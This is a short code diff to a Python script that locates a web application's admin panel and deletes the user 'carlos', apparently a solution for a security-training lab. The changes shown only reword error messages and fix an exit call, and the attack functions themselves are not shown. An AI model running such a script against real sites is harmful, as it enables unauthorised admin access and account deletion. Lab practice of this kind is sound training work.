@@ -29,14 +29,14 @@ def main():
         print("(+) Finding admin panel...")
         admin_panel_path = find_admin_panel(url, session)
         if not admin_panel_path:
-            print("(-) Something went wrong.")
+            print("(-) Something went wrong. Please check your URL and try again.")
             sys.exit(1)
 
         print("(+) Deleting the user \"carlos\"...")
         if delete_user(url, session, admin_panel_path):
             print("(+) Successfully deleted the user \"carlos\"!")
         else:
-            print("(-) Something went wrong. Please check your URL and try again.")
+            print("(-) Unable to delete the user \"carlos\". Please try again. ")
 
 
     except requests.exceptions.Timeout:
@@ -49,7 +49,7 @@ def main():
         print("(-) Unable to connect to host. Please check your URL and try again.")
 
     except KeyboardInterrupt:
-        exit(1)
+        sys.exit(1)
 
 
 if __name__ == "__main__":
